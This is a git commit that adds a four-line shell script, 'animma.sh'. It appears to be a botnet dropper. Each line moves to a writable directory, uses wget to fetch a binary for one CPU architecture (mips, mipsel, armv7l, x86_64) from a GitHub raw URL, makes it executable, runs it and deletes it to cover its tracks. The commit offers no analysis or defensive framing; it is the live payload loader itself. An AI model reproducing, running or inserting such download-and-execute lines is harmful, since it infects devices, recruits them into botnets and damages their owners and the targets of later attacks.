4fbb404024f6014d84bd64abc07c8d8168dcf4e5
20Matrix77 <101499676+20Matrix77@users.noreply.github.com>
2024-10-25 00:09:13 +0500

    Add files via upload

---
+++ animma.sh
@@ -0,0 +1,4 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/ksdeuf/refs/heads/main/mips; chmod +x mips; ./mips; rm -rf mips
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/ksdeuf/refs/heads/main/mipsel; chmod +x mipsel; ./mipsel; rm -rf mipsel
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/armv7l; chmod +x armv7l; ./armv7l; rm -rf armv7l
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/x86_64; chmod +x x86_64; ./x86_64; rm -rf x86_64
